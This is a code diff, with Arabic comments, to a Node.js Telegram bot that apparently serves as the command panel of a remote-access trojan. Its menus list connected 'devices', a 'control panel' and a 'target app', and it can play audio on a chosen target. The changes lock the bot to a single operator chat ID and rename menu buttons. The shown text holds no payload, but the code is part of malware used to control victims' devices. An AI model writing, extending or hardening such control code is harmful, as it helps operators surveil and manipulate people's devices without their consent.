@@ -169,9 +169,18 @@ io.on("connection", socket => {
   });
 });
 
+// التحقق من صلاحية المستخدم
 bot.on("message", msg => {
   const chatId = msg.chat.id;
   const text = msg.text;
+
+  // التحقق من أن المستخدم ليس هو المصرح به
+  if (String(chatId) !== String(config.id)) {
+    if (text === "/start") {
+      bot.sendMessage(chatId, "❌ غير مصرح لك باستخدام هذا البوت.");
+    }
+    return; // إيقاف المعالجة لأي مستخدم غير مصرح
+  }
 
   if (text === "/start") {
     bot.sendMessage(chatId, 
@@ -269,7 +278,7 @@ bot.on("message", msg => {
       reply_markup: {
         keyboard: [
           ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
-          ["👨‍💻 معلومات المطور", "تطبيقات الصدف🗃️☠️"]
+          ["👨‍💻 معلومات المطور", "🗃️☠️تطبيق الهدف"]
         ],
         resize_keyboard: true
       }
@@ -342,7 +351,7 @@ bot.on("message", msg => {
       reply_markup: {
         keyboard: [
           ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
-          ["👨‍💻 معلومات المطور", "/app_link"]
+          ["👨‍💻 معلومات المطور", "🗃️☠️تطبيق الهدف"]
         ],
         resize_keyboard: true
       }
@@ -631,7 +640,16 @@ bot.on("message", msg => {
   }
 });
 
+// التحقق من صلاحية المستخدم للاستجابة للاستدعاءات
 bot.on("callback_query", query => {
+  const chatId = query.message.chat.id;
+  
+  // التحقق من أن المستخدم ليس هو المصرح به
+  if (String(chatId) !== String(config.id)) {
+    bot.answerCallbackQuery(query.id, { text: "❌ غير مصرح لك باستخدام هذا البوت." });
+    return; // إيقاف المعالجة لأي مستخدم غير مصرح
+  }
+
   const data = query.data;
   const [model, actionData] = data.split('|');
   const [actionType, actionValue] = actionData.split('-');
@@ -710,6 +728,14 @@ bot.on("callback_query", query => {
 });
 
 bot.on("voice", msg => {
+  const chatId = msg.chat.id;
+  
+  // التحقق من أن المستخدم ليس هو المصرح به
+  if (String(chatId) !== String(config.id)) {
+    bot.sendMessage(chatId, "❌ غير مصرح لك باستخدام هذا البوت.");
+    return; // إيقاف المعالجة لأي مستخدم غير مصرح
+  }
+
   if (appData.get("currentAction") === "playAudio") {
     const fileId = msg.voice.file_id;
     const target = appData.get("currentTarget");
@@ -728,7 +754,7 @@ bot.on("voice", msg => {
         reply_markup: {
           keyboard: [
             ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
-            ["👨‍💻 معلومات المطور", "تطبيقات الهدف🗃️☠️"]
+            ["👨‍💻 معلومات المطور", "🗃️☠️تطبيق الهدف"]
           ],
           resize_keyboard: true
         }
